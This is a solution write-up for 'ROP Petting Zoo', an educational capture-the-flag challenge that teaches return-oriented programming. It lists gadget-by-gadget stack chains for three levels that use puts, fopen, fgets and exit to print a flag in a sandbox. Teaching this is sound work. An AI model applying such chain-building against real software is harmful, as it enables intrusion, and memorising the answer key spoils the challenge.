ROP Petting Zoo is a challenge designed to teach the principles of
return-oriented programming. It's mostly written in Javascript, with a backend
powered by a Ruby web server, along with a tool I wrote called
[Mandrake](https://github.com/iagox86/mandrake).

Mandrake is a debugger / tracer I wrote that executes a binary and traces all
code run between two points. It will show registers, memory, all the good stuff.
ROP Petting Zoo is kind of a wrapper around that.

Basically, you have a list of potential ROP gadgets and libc calls. You build
a stack from all the ROP gadgets, hit `Execute!`, and the harness will return to
the first address on the stack.

Everything is running forreal in a container, so you get to see what would
actually happen if this is a real exploit!

The challenges are very guided / on-rails, with tutorials that show the exact
steps you will need to take, but here are the solutions I wrote.

It's helpful to remember that when a function is called, the arguments are,
in order, passed in the registers `rdi`, `rsi`, `rdx`, and `rcx`.

## Level 1

* `print_flag()` -> Immediately return to `print_flag`
* `pop rdi / ret` -> Pop the next value into register `rdi`
* `0` -> This is what's popped into `rdi`
* `exit` -> Return to `exit(rdi)` aka `exit(0)`

## Level 2

* `return_flag()` -> Returns the flag in `rax`
* `mov rdi, rax / ret` -> Moves the flag pointer into `rdi`
* `puts` -> Return to `puts(rdi)` or `puts(flag)`
* `pop rdi / ret` -> Pop the next value into `rdi`
* `0` -> This is what's popped into `rdi`
* `exit` -> Return to `exit(rdi)` aka `exit(0)`

## Level 3

This part unfortunately ran a lot slower than I'd intended, but hopefully it's
educational enough:

* `write_flag_to_file()` -> Writes the flag to a file, returns the name in `rax`
* `mov rdi, rax / ret` -> Moves the filename to `rdi`, the first parameter to `fopen()`
* `get_letter_r` -> Returns a pointer to the string `"r"`
* `mov rsi, rax / ret` -> Moves the string `"r"` to `rsi`, the second parameter to `fopen()`
* `fopen()` -> Return to `fopen(rdi, rsi)`, which is `fopen(filename, "r")`
* `mov rdx, rax / ret` -> Move the file handle into `rdx`, the third parameter to `fgets()`
* `get_writable_memory()` -> Get a pointer to some writable memory
* `mov rdi, rax / ret` -> Move the pointer to writable memory to `rdi`, the first parameter to `fgets()`
* `pop rsi / ret` -> Move the next value into `rsi`, the second parameter to `fgets()`
* `0xff` -> This is what's moved into `rsi`
* `fgets()` -> Calls `fgets(rdi, rsi, rdx)`, or `fgets(writable_memory, 0xff, file_handle)`
* `get_writable_memory()` -> Gets a handle to the writable memory again
* `mov rdi, rax / ret` -> Move the writable memory handle into `rdi`, the first argument to `puts`
* `puts` -> Call `puts(rdi)`, or `puts(writable_memory)`
* `pop rdi / ret` -> Move the next value into `rdi`, the first parameter to `exit()`
* `0` -> This is what goes into `rdi`
* `exit()` -> `exit(rdi)` aka `exit(0)`
